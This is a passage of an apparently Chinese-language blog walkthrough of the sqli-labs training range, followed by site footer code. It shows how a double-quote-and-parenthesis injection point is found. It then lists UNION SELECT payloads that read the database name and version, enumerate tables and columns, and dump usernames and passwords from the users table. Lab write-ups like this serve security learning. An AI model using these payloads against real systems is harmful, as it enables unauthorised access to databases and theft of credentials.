+<p><code>1&quot;</code>页面报错，说明有注入点</p>
+<p><figure><a class="lightgallery" href="https://pic.imgdb.cn/item/64cfabf91ddac507cc111909.jpg" title="https://pic.imgdb.cn/item/64cfabf91ddac507cc111909.jpg" data-thumbnail="https://pic.imgdb.cn/item/64cfabf91ddac507cc111909.jpg">
+        <img
+            
+            loading="lazy"
+            src="https://pic.imgdb.cn/item/64cfabf91ddac507cc111909.jpg"
+            srcset="https://pic.imgdb.cn/item/64cfabf91ddac507cc111909.jpg, https://pic.imgdb.cn/item/64cfabf91ddac507cc111909.jpg 1.5x, https://pic.imgdb.cn/item/64cfabf91ddac507cc111909.jpg 2x"
+            sizes="auto"
+            alt="https://pic.imgdb.cn/item/64cfabf91ddac507cc111909.jpg">
+    </a></figure></p>
+<p>并且通过报错信息得知是双引号字符型且用括号闭合</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-mysql" data-lang="mysql"><span class="line"><span class="cl"><span class="mi">1</span><span class="s2">&#34;) order by 3--+
+</span></span></span><span class="line"><span class="cl"><span class="s2">-1&#34;</span><span class="p">)</span><span class="w"> </span><span class="k">union</span><span class="w"> </span><span class="k">select</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span><span class="o">--+</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">-</span><span class="mi">1</span><span class="s2">&#34;) union select 1,database(),version()--+
+</span></span></span><span class="line"><span class="cl"><span class="s2">-1&#34;</span><span class="p">)</span><span class="w"> </span><span class="k">union</span><span class="w"> </span><span class="k">select</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="nf">group_concat</span><span class="p">(</span><span class="n">table_name</span><span class="p">)</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">information_schema</span><span class="p">.</span><span class="kp">tables</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="n">table_schema</span><span class="o">=</span><span class="s1">&#39;security&#39;</span><span class="o">--+</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">-</span><span class="mi">1</span><span class="s2">&#34;) union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;--+
+</span></span></span><span class="line"><span class="cl"><span class="s2">-1&#34;</span><span class="p">)</span><span class="w"> </span><span class="k">union</span><span class="w"> </span><span class="k">select</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="nf">group_concat</span><span class="p">(</span><span class="n">username</span><span class="p">,</span><span class="n">id</span><span class="p">,</span><span class="n">password</span><span class="p">)</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">users</span><span class="o">--+</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>​</p>
+<p>​</p>
+<h3 id="第五关" class="headerLink">
+    <a href="#%e7%ac%ac%e4%ba%94%e5%85%b3" class="header-mark"></a>第五关</h3></div>
+
+        
+
+<div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>更新于 0001-01-01</span>
+            </div>
+            <div class="post-info-license"></div>
+        </div>
+        <div class="post-info-line">
+            <div class="post-info-md"><span><a class="link-to-mardown" href=/sqli-labs%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98/index.md target="_blank" rel="noopener noreferrer">阅读原始文档</a>
+                    </span></div>
+            <div class="post-info-share">
+                <span></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/sqlmap-getshell/" class="prev" rel="prev" title=""><i class="fas fa-angle-left fa-fw"></i></a>
+            <a href="/rce%E6%BC%8F%E6%B4%9E/" class="next" rel="next" title=""><i class="fas fa-angle-right fa-fw"></i></a></div>
+</div>
+<div id="comments"></div></article></div>
+        </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2023</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank" rel="noopener noreferrer">Lyrio</a></span><span class="icp-splitter">&nbsp;|&nbsp;</span><br class="icp-br"/>
+                    <span class="icp">闽ICP备2023013172号</span></div>
+            <div class="footer-line"></div>
+            <div class="footer-line">
+            </div>
+        </div></footer></div>
+
+    <div id="fixed-buttons"><a href="#back-to-top" id="back-to-top-button" class="fixed-button" title="回到顶部">
+            <i class="fas fa-arrow-up fa-fw"></i>
+        </a><a href="#" id="view-comments" class="fixed-button" title="查看评论">
+            <i class="fas fa-comment fa-fw"></i>
+        </a>
+    </div><div id="cookieconsent-container"></div><div class="assets"><link rel="stylesheet" href="/lib/katex/katex.min.css"><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="/lib/katex/copy-tex.min.css">
+        <noscript><link rel="stylesheet" href="/lib/katex/copy-tex.min.css"></noscript><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><script type="text/javascript">window.config={"code":{"copyTitle":"复制到剪贴板","maxShownLines":10},"comment":{},"cookieconsent":{"content":{"dismiss":"同意","link":"了解更多","message":"本网站使用 Cookies 来改善您的浏览体验."},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"theme":"edgeless"},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"search":{"distance":100,"findAllMatches":false,"fuseIndexURL":"/index.json","highlightTag":"em","ignoreFieldNorm":false,"ignoreLocation":false,"isCaseSensitive":false,"location":0,"maxResultLength":10,"minMatchCharLength":2,"noResultsFound":"没有找到结果","snippetLength":50,"threshold":0.3,"type":"fuse","useExtendedSearch":false},"table":{"sort":true}};</script><script type="text/javascript" src="/lib/tablesort/tablesort.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/katex/katex.min.js" defer></script><script type="text/javascript" src="/lib/katex/auto-render.min.js" defer></script><script type="text/javascript" src="/lib/katex/copy-tex.min.js" defer></script><script type="text/javascript" src="/lib/katex/mhchem.min.js" defer></script><script type="text/javascript" src="/js/katex.min.js" defer></script><script type="text/javascript" src="/lib/cookieconsent/cookieconsent.min.js" defer></script><script type="text/javascript" src="/js/cookieconsent.min.js" defer></script><script type="text/javascript" src="/js/theme.min.js" defer></script></div>
+</body>
+
+</html>
